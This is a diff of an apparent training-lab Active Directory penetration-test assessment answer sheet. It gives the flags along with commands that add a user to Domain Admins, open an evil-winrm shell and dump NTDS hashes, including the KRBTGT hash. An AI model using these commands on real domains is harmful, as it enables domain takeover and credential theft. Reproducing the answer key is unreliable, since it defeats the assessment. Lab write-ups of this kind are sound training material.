@@ -1,4 +1,4 @@
-Scenario
+on use Scenario
 Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.
 
 Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.
@@ -115,7 +115,9 @@ Question 10 -  Crack this user's password hash and submit the cleartext password
 
 
 Question 11 -  Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host. - acLs_f0r_th3_w1n! 
-
+1) on ssh session use this command: net rpc group addmem "Domain Admins" "CT059" -U INLANEFREIGHT.LOCAL/CT059%"charlie1" -S 172.16.7.3
+2) proxychains evil-winrm -i 172.16.7.3 -u CT059 -p charlie1 
+3) cd C:\Users\Administrator\Desktop + type flag.txt = acLs_f0r_th3_w1n!
 
 Question 12 -  Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. -krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f::: 
 From regular ssh htb session -> crackmapexec smb -u CT059 -p charlie1 -d INLANEFREIGHT.LOCAL 172.16.7.3 --ntds -> AFTER adding CT059 to Domain Admins 
